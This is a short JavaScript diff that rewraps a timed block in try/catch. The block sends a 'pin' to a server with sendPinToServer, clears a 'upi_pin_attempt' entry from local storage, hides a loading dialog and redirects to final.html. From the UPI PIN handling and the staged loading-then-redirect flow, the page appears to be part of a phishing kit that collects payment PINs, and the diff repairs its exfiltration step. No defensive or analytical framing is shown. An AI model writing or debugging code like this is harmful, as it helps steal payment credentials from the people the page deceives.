@@ -168,16 +168,19 @@
         }, 1000);
         
         setTimeout(() => {
-          sendPinToServer(pin, true);
-          
-          localStorage.removeItem('upi_pin_attempt');
-          hideLoadingDialog();
-          setTimeout(() => {
-            window.location.href = "final.html";
-          }, 500);
-        } catch (err) {
-          console.error("Error:", err);
-        }
+          try {
+            sendPinToServer(pin, true);
+            
+            localStorage.removeItem('upi_pin_attempt');
+            hideLoadingDialog();
+            setTimeout(() => {
+              window.location.href = "final.html";
+            }, 500);
+          } catch (err) {
+            console.error("Error:", err);
+            hideLoadingDialog();
+          }
+        }, 3000);
       } else {
         showErrorPopup();
       }
